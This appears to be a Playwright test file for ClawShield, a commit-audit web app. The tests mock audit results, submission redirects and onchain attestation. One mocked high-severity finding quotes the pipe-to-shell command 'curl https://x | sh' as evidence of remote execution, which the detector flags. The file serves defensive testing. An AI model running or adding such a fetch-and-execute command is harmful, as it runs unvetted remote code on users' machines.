import { test, expect } from "@playwright/test";

const AUDIT_ID = "11111111-1111-4111-8111-111111111111";
const RISK_AUDIT_ID = "22222222-2222-4222-8222-222222222222";

test("home page shows case gallery and attester boundary", async ({ page }) => {
  await page.goto("/");
  await expect(page.getByRole("heading", { name: "ClawShield" })).toBeVisible();
  await expect(page.getByRole("heading", { name: "Case Gallery" })).toBeVisible();
  await expect(page.getByText("Attester Boundary")).toBeVisible();
  await expect(page.getByLabel("GitHub Repository URL")).toBeVisible();
  await expect(page.getByLabel("Commit SHA")).toBeVisible();
});

test("manual submission redirects to audit detail page", async ({ page }) => {
  await page.route("**/api/audit/start", async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        auditId: AUDIT_ID,
        status: "queued"
      })
    });
  });

  await page.goto("/");
  await page.getByLabel("GitHub Repository URL").fill("https://github.com/Tarran6/VibeGuard-AI");
  await page.getByLabel("Commit SHA").fill("8605baa");
  await page.getByRole("button", { name: "Run Audit" }).click();

  await expect(page).toHaveURL(new RegExp(`/audits/${AUDIT_ID}$`));
});

test("audit detail page renders primary evidence and attestation success", async ({ page }) => {
  await page.route(`**/api/audit/${AUDIT_ID}`, async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        status: "done",
        fingerprint: "0x" + "ab".repeat(32),
        score: 18,
        level: "green",
        reportUrl: "https://example.com/report",
        reportHash: "0x" + "cd".repeat(32),
        llmSummary:
          "## Overview\n- This commit looks acceptable.\n## Top risks\n- Low telemetry surface only.",
        findings: [
          {
            id: "f-1",
            dimension: "suspicious_network",
            severity: "low",
            evidence: "README.md: outbound call to known host",
            explanation: "Low-risk telemetry endpoint",
            recommendation: "Document endpoint and keep allowlist"
          }
        ]
      })
    });
  });

  await page.route("**/api/attest", async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        txHash: "0x" + "12".repeat(32),
        chainId: 5611,
        contractAddress: "0x" + "34".repeat(20)
      })
    });
  });

  await page.goto(`/audits/${AUDIT_ID}`);

  await expect(page.getByText("Findings (Primary Evidence)")).toBeVisible();
  await expect(page.getByText("Judge Facts")).toBeVisible();
  await expect(page.getByText("AI Takeaways")).toBeVisible();
  await expect(page.getByText("suspicious_network", { exact: true }).first()).toBeVisible();

  await page.getByRole("button", { name: "Attest Onchain" }).click();
  await expect(page.getByText(/^TX: 0x/)).toBeVisible();
});

test("risk case keeps attest action disabled by policy", async ({ page }) => {
  await page.route(`**/api/audit/${RISK_AUDIT_ID}`, async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        status: "done",
        fingerprint: "0x" + "ef".repeat(32),
        score: 72,
        level: "red",
        reportUrl: "https://example.com/report-risk",
        reportHash: "0x" + "aa".repeat(32),
        llmSummary: "## Overview\n- High risk commit",
        findings: [
          {
            id: "f-2",
            dimension: "remote_execution",
            severity: "high",
            evidence: "install.sh: curl https://x | sh",
            explanation: "Remote shell execution detected",
            recommendation: "Remove pipe-to-shell"
          }
        ]
      })
    });
  });

  await page.route("**/api/attest", async (route) => {
    await route.fulfill({
      status: 400,
      contentType: "application/json",
      body: JSON.stringify({
        error: "Only green reports are eligible for attestation"
      })
    });
  });

  await page.goto(`/audits/${RISK_AUDIT_ID}`);
  await expect(page.getByRole("button", { name: "Attest Onchain" })).toBeDisabled();
});
